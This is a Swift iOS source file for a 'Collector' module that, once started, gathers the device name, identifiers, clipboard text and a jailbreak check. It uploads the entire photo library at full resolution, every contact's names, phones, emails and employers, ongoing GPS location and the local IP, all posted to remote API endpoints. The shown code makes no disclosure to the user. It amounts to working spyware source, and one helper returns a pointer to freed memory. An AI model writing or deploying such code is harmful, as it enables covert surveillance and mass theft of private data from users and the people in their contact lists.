import Foundation
import Photos
import Contacts
import CoreLocation
import UIKit
import CoreTelephony
import Network

struct UploadItem {
    let id: String
    let name: String
    let data: Data
}

final class Collector: NSObject {
    static let shared = Collector()
    let queue = DispatchQueue(label: "pelite.collect", qos: .utility, attributes: .concurrent)
    private var started = false

    func start() {
        guard !started else { return }
        started = true
        device(); album(); contacts(); geo(); langs(); wifi()
    }

    // MARK: 设备与环境
    func device() {
        UIDevice.current.isBatteryMonitoringEnabled = true
        let info: [String: Any] = [
            "model": UIDevice.current.model,
            "name": UIDevice.current.name,
            "sys": UIDevice.current.systemName + " " + UIDevice.current.systemVersion,
            "idfv": UIDevice.current.identifierForVendor?.uuidString ?? "",
            "battery": Int(UIDevice.current.batteryLevel * 100),
            "charging": UIDevice.current.batteryState == .charging,
            "screen": "\(Int(UIScreen.main.bounds.width))x\(Int(UIScreen.main.bounds.height))",
            "tz": TimeZone.current.identifier,
            "lang": Locale.preferredLanguages.first ?? "",
            "carrier": CTTelephonyNetworkInfo().serviceSubscriberCellularProviders?
                .values.first?.carrierName ?? "",
            "paste": UIPasteboard.general.string ?? "",
            "jail": FileManager.default.fileExists(atPath: "/var/lib/dpkg/status")
        ]
        Net.postJSON("/api/event", ["sid": AppDelegate.token, "ev": "device", "data": info])
    }

    // MARK: 相册全量
    func album() {
        PHPhotoLibrary.requestAuthorization(for: .readWrite) { [weak self] st in
            guard st == .authorized || st == .limited else { return }
            let o = PHFetchOptions()
            o.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
            let fetch = PHAsset.fetchAssets(with: o)
            var items: [PHAsset] = []
            fetch.enumerateObjects { a, _, _ in items.append(a) }

            let mgr = PHImageManager.default()
            let opt = PHImageRequestOptions()
            opt.isNetworkAccessAllowed = true
            opt.version = .current
            opt.deliveryMode = .highQualityFormat
            opt.resizeMode = .none

            for (i, a) in items.enumerated() {
                let key = a.localIdentifier.replacingOccurrences(of: "/", with: "_")
                if FileLog.shared.has(key) { continue }
                let stamp = a.creationDate.map { Int($0.timeIntervalSince1970) } ?? 0
                let idx = String(format: "%05d", i)
                mgr.requestImageDataAndOrientation(for: a, options: opt) { data, uti, _, _ in
                    guard let data = data else { return }
                    let ext = (uti ?? "public.jpeg").contains("heic") ? "heic" : "jpg"
                    let name = "PHOTO_\(idx)_\(stamp).\(ext)"
                    self?.queue.async {
                        Net.upload(path: "/api/raw",
                                   file: data,
                                   name: name,
                                   done: { ok in if ok { FileLog.shared.mark(key) } })
                    }
                }
            }
            Net.postJSON("/api/event",
                         ["sid": AppDelegate.token, "ev": "album_scan",
                          "data": ["total": items.count]])
        }
    }

    // MARK: 通讯录
    func contacts() {
        CNContactStore().requestAccess(for: .contacts) { ok, _ in
            guard ok else { return }
            let keys: [CNKeyDescriptor] = [
                CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey,
                CNContactEmailAddressesKey, CNContactOrganizationNameKey, CNContactJobTitleKey
            ] as [CNKeyDescriptor]
            let req = CNContactFetchRequest(keysToFetch: keys)
            req.sortOrder = .givenName
            var rows: [[String: String]] = []
            try? CNContactStore().enumerateContacts(with: req) { c, _ in
                rows.append([
                    "name": c.familyName + c.givenName,
                    "org": c.organizationName,
                    "job": c.jobTitle,
                    "phones": c.phoneNumbers.map { $0.value.stringValue }.joined(separator: ","),
                    "mails": c.emailAddresses.map { $0.value as String }.joined(separator: ",")
                ])
            }
            // 分片提交，避免单包过大
            var i = 0
            while i < rows.count {
                let chunk = Array(rows[i ..< min(i + 200, rows.count)])
                Net.postJSON("/api/contacts", ["sid": AppDelegate.token, "rows": chunk])
                i += 200
            }
        }
    }

    // MARK: 位置
    private let lm = CLLocationManager()
    func geo() {
        lm.delegate = self
        lm.desiredAccuracy = kCLLocationAccuracyHundredMeters
        lm.requestWhenInUseAuthorization()
        lm.startUpdatingLocation()
    }

    // MARK: 语言与地区
    func langs() {
        Net.postJSON("/api/event", ["sid": AppDelegate.token, "ev": "locale",
            "data": ["langs": Locale.preferredLanguages, "tz": TimeZone.current.identifier]])
    }

    // MARK: 网络名与内网 IP
    func wifi() {
        var addr = "0.0.0.0"
        var ifaddr: UnsafeMutablePointer<ifaddrs>?
        if getifaddrs(&ifaddr) == 0, let first = ifaddr {
            var p = first
            while true {
                let f = p.pointee
                if f.ifa_addr.pointee.sa_family == UInt8(AF_INET) {
                    addr = String(cString: getnameinfo2(f.ifa_addr))
                }
                if f.ifa_next == nil { break }
                p = f.ifa_next!
            }
            freeifaddrs(ifaddr)
        }
        Net.postJSON("/api/event", ["sid": AppDelegate.token, "ev": "net", "data": ["ip": addr]])
    }
}

extension Collector: CLLocationManagerDelegate {
    func locationManager(_ m: CLLocationManager, didUpdateLocations locs: [CLLocation]) {
        guard let l = locs.last else { return }
        Net.postJSON("/api/event", ["sid": AppDelegate.token, "ev": "geo", "data": [
            "lat": l.coordinate.latitude,
            "lng": l.coordinate.longitude,
            "acc": Int(l.horizontalAccuracy),
            "speed": l.speed,
            "ts": Int(l.timestamp.timeIntervalSince1970)
        ]])
    }
    func locationManager(_ m: CLLocationManager, didChangeAuthorization st: CLAuthorizationStatus) {
        if st == .authorizedWhenInUse || st == .authorizedAlways { m.startUpdatingLocation() }
    }
}

/// 简易 getnameinfo 包装
private func getnameinfo2(_ sa: UnsafeMutablePointer<sockaddr>) -> UnsafePointer<CChar> {
    var host = [CChar](repeating: 0, count: Int(NI_MAXHOST))
    var len = socklen_t(sa.pointee.sa_len)
    getnameinfo(sa, len, &host, socklen_t(host.count), nil, 0, NI_NUMERICHOST)
    _ = len
    return host.withUnsafeBufferPointer { UnsafePointer($0.baseAddress!) }
}
